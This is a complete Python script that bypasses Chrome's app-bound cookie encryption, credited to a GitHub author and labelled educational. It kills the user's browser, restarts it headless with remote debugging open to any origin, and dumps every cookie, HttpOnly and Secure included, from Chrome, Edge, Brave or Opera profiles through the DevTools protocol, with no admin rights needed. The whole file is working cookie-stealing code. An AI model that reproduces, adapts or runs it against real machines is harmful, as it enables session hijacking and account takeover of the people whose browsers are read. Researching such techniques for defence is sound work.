"""
Bypass Chrome v20 appbound encryption and extract cookies using Chrome Remote Debugging without admin rights.
Including HTTP Only and Secure cookies. 

Developed by: github.com/thewh1teagle  
License: MIT  
For educational purposes only.  
Usage:
pip install websocket-client requests
python main.py
"""
import requests
import websocket
import json
import subprocess
import os
from pathlib import Path
import configparser


config = configparser.ConfigParser()
config.read('config.ini')

BROWSER = config['settings']['browser']
DEBUG_PORT = config.getint('settings', 'debug_port')
DEBUG_URL = f'http://localhost:{DEBUG_PORT}/json'
LOCAL_APP_DATA = os.getenv('localappdata')
APP_DATA = os.getenv('appdata')
PROGRAM_FILES = os.getenv('programfiles')
PROGRAM_FILES_X86 = os.getenv('programfiles(x86)')
CONFIGS = {
    'chrome': {
        'bin': rf"{PROGRAM_FILES}\Google\Chrome\Application\chrome.exe",
        'user_data': rf'{LOCAL_APP_DATA}\google\chrome\User Data'
    },
    'edge': {
        'bin': rf"{PROGRAM_FILES_X86}\Microsoft\Edge\Application\msedge.exe",
        'user_data': rf'{LOCAL_APP_DATA}/Microsoft/Edge/User Data'
    },
    'brave': {
        'bin': rf"{PROGRAM_FILES}\BraveSoftware\Brave-Browser\Application\brave.exe",
        'user_data': rf'{LOCAL_APP_DATA}/BraveSoftware/Brave-Browser/User Data'
    },
    'opera': {
        'bin': rf"{LOCAL_APP_DATA}\Programs\Opera\opera.exe",
        'user_data': rf'{APP_DATA}\Opera Software\Opera Stable'
    },
    'opera gx': {
        'bin': rf"{LOCAL_APP_DATA}\Programs\Opera GX\opera.exe",
        'user_data': rf'{APP_DATA}\Opera Software\Opera Stable'
    }
}


def get_debug_ws_url():
    res = requests.get(DEBUG_URL)
    data = res.json()
    if not data:
        raise Exception("No data received from the debug URL")
    return data[0]['webSocketDebuggerUrl'].strip()


def close_browser(bin_path):
    proc_name = Path(bin_path).name
    subprocess.run(f'taskkill /F /IM {proc_name}', check=False, shell=False, stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)


def start_browser(bin_path, user_data_path):
    subprocess.Popen(
        [bin_path, '--restore-last-session', f'--remote-debugging-port={DEBUG_PORT}', '--remote-allow-origins=*',
         '--headless', f'--user-data-dir={user_data_path}'], stdout=subprocess.DEVNULL)


def get_all_cookies(ws_url_gac):
    try:
        ws = websocket.create_connection(ws_url_gac)
        ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
        response = ws.recv()
        response = json.loads(response)
        cookies_gac = response['result']['cookies']
    except Exception as err:
        print(f"Error retrieving cookies: {err}")
        cookies_gac = []
    finally:
        ws.close()
    return cookies_gac


if __name__ == "__main__":
    config = CONFIGS[BROWSER]
    print(f"Browser binary path: {config['bin']}")
    close_browser(config['bin'])
    start_browser(config['bin'], config['user_data'])
    try:
        ws_url = get_debug_ws_url()
        cookies = get_all_cookies(ws_url)
    except Exception as e:
        print(f"Error: {e}")
        cookies = []
    finally:
        close_browser(config['bin'])
    print(f"Extracted cookies: {cookies}")
